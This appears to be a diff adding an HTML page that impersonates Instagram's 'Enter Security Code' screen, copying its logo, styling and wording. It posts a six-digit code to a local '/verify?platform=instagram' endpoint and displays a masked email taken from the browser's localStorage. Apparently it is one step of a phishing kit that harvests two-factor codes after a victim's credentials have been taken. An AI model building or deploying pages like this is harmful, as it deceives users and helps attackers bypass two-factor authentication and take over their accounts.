@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter Security Code • Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 388px;
+            width: 100%;
+        }
+        .card {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 24px 40px;
+            margin-bottom: 10px;
+        }
+        .logo {
+            display: block;
+            margin: 0 auto 12px;
+            width: 175px;
+        }
+        h1 {
+            color: #262626;
+            font-size: 16px;
+            font-weight: 600;
+            line-height: 24px;
+            margin: 0 0 12px;
+            text-align: center;
+        }
+        .subtitle {
+            color: #8e8e8e;
+            font-size: 14px;
+            line-height: 18px;
+            margin: 0 0 16px;
+            text-align: center;
+        }
+        .code-info {
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            color: #262626;
+            font-size: 14px;
+            line-height: 18px;
+            margin: 0 0 16px;
+            padding: 12px;
+        }
+        .otp-form {
+            margin-top: 24px;
+        }
+        .input-group {
+            margin-bottom: 16px;
+        }
+        .input-group label {
+            color: #262626;
+            font-size: 14px;
+            font-weight: 600;
+            line-height: 18px;
+            margin-bottom: 8px;
+            display: block;
+        }
+        .otp-input {
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            color: #262626;
+            font-size: 16px;
+            height: 32px;
+            padding: 0 8px;
+            width: 100%;
+        }
+        .otp-input:focus {
+            border-color: #a8a8a8;
+            outline: none;
+        }
+        .verify-button {
+            background-color: #0095f6;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 600;
+            padding: 5px 9px;
+            text-align: center;
+            width: 100%;
+            margin-bottom: 16px;
+        }
+        .verify-button:hover {
+            background-color: #0081d6;
+        }
+        .help-links {
+            margin-top: 24px;
+            text-align: center;
+        }
+        .help-links a {
+            color: #00376b;
+            font-size: 12px;
+            line-height: 16px;
+            margin-bottom: 8px;
+            text-decoration: none;
+            display: block;
+        }
+        .help-links a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
+            <h1>Enter Security Code</h1>
+            <p class="subtitle">To help keep your account secure, we need to verify it's really you.</p>
+            <div class="code-info">
+                We sent a code to:<br>
+                <strong id="masked-email"></strong>
+            </div>
+            <form class="otp-form" method="POST" action="/verify?platform=instagram">
+                <div class="input-group">
+                    <label for="otp">Security Code</label>
+                    <input type="text" id="otp" name="otp" class="otp-input" required pattern="[0-9]{6}" maxlength="6" inputmode="numeric" autocomplete="one-time-code">
+                </div>
+                <button type="submit" class="verify-button">Submit</button>
+            </form>
+            <div class="help-links">
+                <a href="#">Didn't get a code?</a>
+                <a href="#">Need more help?</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        // Mask the email address
+        const email = localStorage.getItem('user_email') || 'your email';
+        const maskedEmail = email.replace(/(\w{2})[\w.-]+@([\w.]+)/, '$1***@$2');
+        document.getElementById('masked-email').textContent = maskedEmail;
+
+        // Handle numeric input only
+        const otpInput = document.getElementById('otp');
+        otpInput.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+    </script>
+</body>
+</html> 
